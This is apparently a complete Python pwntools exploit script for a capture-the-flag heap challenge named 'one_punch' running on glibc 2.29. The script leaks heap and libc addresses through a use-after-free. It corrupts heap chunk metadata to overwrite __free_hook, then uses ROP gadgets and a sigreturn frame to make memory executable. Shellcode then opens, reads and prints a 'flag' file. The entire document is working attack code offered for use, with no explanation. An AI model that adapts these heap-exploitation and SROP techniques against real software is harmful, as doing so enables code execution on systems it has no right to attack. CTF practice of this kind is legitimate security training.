#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './one_punch'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.29.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''

    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(index, content):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter('idx: ', str(index))
    sh.sendafter('name: ', content)

def edit(index, content):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter('idx: ', str(index))
    sh.sendafter('name: ', content)

def show(index):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter('idx: ', str(index))
    sh.recvuntil('name: ')
    return sh.recvuntil('\n', drop=True)

def delete(index):
    sh.sendlineafter('> ', '4')
    sh.sendlineafter('idx: ', str(index))

def backdoor(content):
    sh.sendlineafter('> ', '50056')
    time.sleep(0.1)
    sh.send(content)

add(2, 'a' * 0x217)

for i in range(2):
    add(0, 'a' * 0x217)
    delete(0)

result = show(0)
heap_addr = u64(result.ljust(8, '\0')) & 0xfffffffffffff000
log.success('heap_addr: ' + hex(heap_addr))

for i in range(5):
    add(0, 'a' * 0x217)
    delete(0)

delete(2)
result = show(2)
libc_addr = u64(result.ljust(8, '\0')) - 0x1e4ca0
log.success('libc_addr: ' + hex(libc_addr))

length = 0xe0
add(0, 'a' * length)
add(0, 'a' * 0x80)
edit(2, '\0' * length + p64(0) + p64(0x21))
delete(0)
edit(2, '\0' * length + p64(0) + p64(0x31))
delete(0)

edit(2, '\0' * length + p64(0) + p64(0x3a1))
delete(0)

for i in range(3):
    add(1, 'b' * 0x3a8)
    delete(1)

edit(2, '\0' * length + p64(0x300) + p64(0x570) + p64(0) + p64(0) + p64(heap_addr + 0x40) + p64(heap_addr + 0x40))
delete(0)

add(0, 'c' * 0x100 + p64(libc_addr + libc.symbols['__free_hook']) + '\0')

# 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; 
layout = [
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    10,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
    heap_addr + 0x260 + 0xf8,
]
backdoor(p64(libc_addr + 0x000000000012be97) + flat(layout) + '\0')
frame = SigreturnFrame()
frame.rdi = heap_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = libc_addr + libc.symbols['__free_hook'] + 8
frame.rip = libc_addr + 0x55cc4 # ret

shellcode = asm('''
push 0x67616c66 ;// flag
mov rdi, rsp
xor esi, esi
mov eax, 2
syscall

cmp eax, 0
js fail

mov edi, eax
mov rsi, rsp
mov edx, 100
xor eax, eax
syscall ;// read

mov edx, eax
mov rsi, rsp
mov eax, 1
mov edi, eax
syscall ;// write

jmp exit

fail:
mov rax, 0x727265206e65706f ;// open error!
mov [rsp], rax
mov eax, 0x0a21726f
mov [rsp+8], rax
mov rsi, rsp
mov edi, 1
mov edx, 12
mov eax, edi
syscall ;// write


exit:
xor edi, edi
mov eax, 231
syscall 
''')
edit(2, p64(libc_addr + 0x55E35) + p64(heap_addr + 0x260) + str(frame)[0x10:] + shellcode)

delete(2)

sh.interactive()
clear()